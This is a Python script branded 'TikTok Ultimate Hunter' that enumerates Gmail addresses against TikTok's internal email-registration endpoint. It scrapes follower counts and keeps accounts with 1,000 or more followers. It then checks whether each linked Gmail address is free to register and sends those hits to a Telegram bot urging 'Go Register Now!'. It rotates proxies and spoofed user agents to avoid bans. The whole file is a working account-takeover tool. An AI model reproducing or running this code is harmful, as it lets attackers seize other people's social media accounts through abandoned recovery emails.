import requests
import random
import time
import json
import string
import os
import sys
import re
from threading import Thread, Lock
from datetime import datetime
from user_agent import generate_user_agent as ua

# --- [ CONFIGURATION & THEME ] ---
P = '\x1b[1;97m'  # White
B = '\x1b[1;94m'  # Blue
O = '\x1b[1;96m'  # Cyan
Z = "\033[1;30m"  # Grey
X = '\033[1;33m'  # Yellow
F = '\033[2;32m'  # Green
Z3 = '\033[1;31m' # Red
L = "\033[1;95m"  # Pink
C = '\033[2;35m'  # Purple
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'

# Stats & Safety
lock = Lock()
stats = {
    "checked": 0,
    "tiktok_reg": 0,
    "tiktok_not_reg": 0,
    "gmail_avail": 0,
    "gmail_not_avail": 0,
    "hits": 0,
    "proxy_err": 0
}

# Load Proxies
proxies_list = []
if os.path.exists('proxy.txt'):
    with open('proxy.txt', 'r') as f:
        proxies_list = [line.strip() for line in f if line.strip()]

def get_proxy():
    if not proxies_list:
        return None
    p = random.choice(proxies_list)
    return {"http": f"http://{p}", "https": f"http://{p}"}

def clear():
    os.system('clear||cls')

def banner():
    sd = random.choice([J1, J2, F1, C1])
    clear()
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 - 𝑽𝟒.𝟎 𝑹𝑬𝑨𝑳 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(sd + r"""
         ██╗ ███╗   ██╗ ███████╗ ████████╗  █████╗
         ██║ ████╗  ██║ ██╔════╝ ╚══██╔══╝ ██╔══██╗
         ██║ ██╔██╗ ██║ ███████╗    ██║    ███████║
         ██║ ██║╚██╗██║ ╚════██║    ██║    ██╔══██║
         ██║ ██║ ╚████║ ███████║    ██║    ██║  ██║
         ╚═╝ ╚═╝  ╚═══╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝
    """ + f"""
        {X}¸.•´¯`•.¸¸ {F} [꧁ 𝑻𝑰𝑲𝑻𝑶𝑲 𝑼𝑳𝑻𝑰𝑴𝑨𝑻𝑬 𝑯𝑼𝑵𝑻𝑬𝑹 ꧂ ]    {X}¸.•´¯`•.¸¸                       
              {F}PROXIES LOADED: {len(proxies_list)} | @ELIA_py
{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
    """)

class UltimateHunter:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id

    def send_hit(self, username, followers):
        tlg = f'''
🔥 𝐑𝐄𝐀𝐋 𝐇𝐈𝐓 𝐅𝐎𝐔𝐍𝐃 🔥
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
👤 𝗨𝘀𝗲𝗿 : {username}
📧 𝗘𝗺𝗮𝗶𝗹 : {username}@gmail.com
📊 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followers:,}
✅ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗘𝗺𝗮𝗶𝗹 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 (𝗦𝗶𝗴𝗻𝗨𝗽)
🚀 𝗔𝗰𝘁𝗶𝗼𝗻 : 𝗚𝗼 𝗥𝗲𝗴𝗶𝘀𝘁𝗲𝗿 𝗡𝗼𝘄!
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
        '''
        try:
            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage", json={
                "chat_id": self.chat_id, "text": tlg,
                "reply_markup": {"inline_keyboard": [[{"text": "Channel", "url": "https://t.me/XRRHX"}]]}
            })
            with lock: stats["hits"] += 1
        except: pass

    def check_gmail_signup(self, email, proxy):
        """Real Gmail Signup Check - Simulating Google Signup Flow"""
        try:
            s = requests.Session()
            u_agent = ua()
            # Initial hit to get cookies
            s.get('https://accounts.google.com/lifecycle/flows/signup?service=mail', headers={'User-Agent': u_agent}, proxies=proxy, timeout=10)
            # Direct availability check
            res = s.get(f"https://mail.google.com/mail/gxlu?email={email}", headers={'User-Agent': u_agent}, proxies=proxy, timeout=10)
            return 'Set-Cookie' not in res.headers
        except: return False

    def check_tiktok_real(self, email, proxy):
        """Real TikTok Registration Check using Passport Internal API"""
        try:
            url = "https://www.tiktok.com/passport/email/check_email_registered"
            params = {"email": email, "aid": 1233, "language": "en"}
            headers = {
                "User-Agent": ua(),
                "Accept": "application/json",
                "Referer": "https://www.tiktok.com/login/phone-or-email/email"
            }
            res = requests.get(url, params=params, headers=headers, proxies=proxy, timeout=10).json()
            return res.get("is_registered") == 1
        except:
            with lock: stats["proxy_err"] += 1
            return False

    def get_followers(self, username, proxy):
        """Extract Followers Count from Profile Page"""
        try:
            url = f"https://www.tiktok.com/@{username}"
            res = requests.get(url, headers={"User-Agent": ua()}, proxies=proxy, timeout=10)
            match = re.search(r'"followerCount":(\d+)', res.text)
            return int(match.group(1)) if match else 0
        except: return 0

    def hunt(self):
        while True:
            try:
                proxy = get_proxy()
                # Intelligent patterns for real accounts
                base = random.choice(["user", "king", "pro", "star", "official", "master", "dark", "light", "love", "life"])
                suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(2, 4)))
                username = base + suffix
                email = f"{username}@gmail.com"

                with lock: stats["checked"] += 1
                
                # 1. Real TikTok Reg Check
                if self.check_tiktok_real(email, proxy):
                    with lock: stats["tiktok_reg"] += 1
                    
                    # 2. Real Followers Check
                    followers = self.get_followers(username, proxy)
                    if followers >= 1000:
                        
                        # 3. Real Gmail Signup Check
                        if self.check_gmail_signup(email, proxy):
                            with lock: stats["gmail_avail"] += 1
                            self.send_hit(username, followers)
                        else:
                            with lock: stats["gmail_not_avail"] += 1
                else:
                    with lock: stats["tiktok_not_reg"] += 1
                
                self.update_display()
            except: pass

    def update_display(self):
        with lock:
            c, tr, tnr, ga, gna, h, pe = stats["checked"], stats["tiktok_reg"], stats["tiktok_not_reg"], stats["gmail_avail"], stats["gmail_not_avail"], stats["hits"], stats["proxy_err"]
            sys.stdout.write(f"\r{Z}[{P}{datetime.now().strftime('%H:%M:%S')}{Z}] {O}Check: {P}{c} {Z}| {F}T-Reg: {P}{tr} {Z}| {Z3}T-Not: {P}{tnr} {Z}| {C1}G-Hit: {P}{ga} {Z}| {J2}G-Fail: {P}{gna} {Z}| {F}HITS: {P}{h} {Z}| {Z3}P-Err: {P}{pe} ")
            sys.stdout.flush()

if __name__ == "__main__":
    banner()
    if not proxies_list:
        print(f"{Z3} [!] WARNING: No proxy.txt found. Running on local IP (High risk of ban!){P}\n")
    
    bot_token = input(f"{P} [{F}?{P}] BOT TOKEN : ")
    chat_id = input(f"{P} [{F}?{P}] CHAT ID   : ")
    threads_num = int(input(f"{P} [{F}?{P}] THREADS   : "))
    
    hunter = UltimateHunter(bot_token, chat_id)
    banner()
    for _ in range(threads_num):
        t = Thread(target=hunter.hunt)
        t.daemon = True
        t.start()
        
    while True:
        time.sleep(1)
